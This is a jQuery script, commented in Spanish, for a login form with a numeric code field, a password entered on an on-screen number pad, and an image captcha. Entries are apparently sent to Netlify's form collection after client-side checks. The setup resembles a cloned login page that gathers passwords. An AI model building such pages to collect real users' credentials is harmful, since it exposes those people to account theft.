// El resto de tu código JS...

$(function(){
	// self.setTimeout('reload()',<?php echo timepad() ?>); // Esta línea con PHP no funcionará en Netlify, puedes comentarla o eliminarla.
	$('#t1').val("");
	$('#t2').val("");	
	$('#t1').focus();
	
	$('#Submit').click(function(){
		$('#t2').removeAttr("disabled");
	});

	// ESTE ES EL BLOQUE QUE DEBE QUEDAR ASÍ EN TU JS
	$('#form_login').submit(function(){
		// Validaciones de cliente (se mantienen)
		if ( $('#t1').val() == "" ){
			swal({
			  title: "Cuidado!",
			  text: "Debe ingresar su c\u00f3digo",
			  confirmButtonColor: "#0e1d56",
			  type: "warning"
			});
			return false; // Si esta validación falla, el formulario NO se enviará.
		}

		if ( $('#t2').val() == "" ){
			swal({
			  title: "Cuidado!",
			  text: "Debe ingresar su contrase\u00f1a.",
			  confirmButtonColor: "#0e1d56",
			  type: "warning"
			});
			return false; // Si esta validación falla, el formulario NO se enviará.
		}

		if ( $('#kamousagi').val() == "" ){
			swal({
			  title: "Cuidado!",
			  text: "Debe ingresar el c\u00f3digo de la imagen.",
			  confirmButtonColor: "#0e1d56",
			  type: "warning"
			});
			return false; // Si esta validación falla, el formulario NO se enviará.
		}
        
        // Si todas las validaciones anteriores pasan, el formulario se enviará de FORMA NATIVA
        // a Netlify (gracias a data-netlify="true" en el HTML).
        // NO DEBE HABER NINGÚN CÓDIGO AJAX ($.ajax) NI event.preventDefault() AQUÍ.
        // Si llega a este punto, automáticamente se enviará el formulario.
	});
	
	$('.delete').click(function(){
		$('#t2').val("");			
	});
	
	$('#t1').keyup(function(){
		var str = $('#t1').val(); 
		var res = "";
		var i = 0;
		while(i < str.length){
			var c = str.charAt(i);
			if (c == '0' || c == '1' || c == '2' || c == '3' || c == '4' || c == '5' || c == '6' || c == '7' || c == '8' || c == '9' ){
				res += c;
			}
			i++;
		}
		$('#t1').val(res);
	});
	
	// FUNCTIONS FOR THE NUMBER PAD
	setChar = function(c){
		var str = $('#t2').val();
		$('#t2').val(str + c);
	}
});
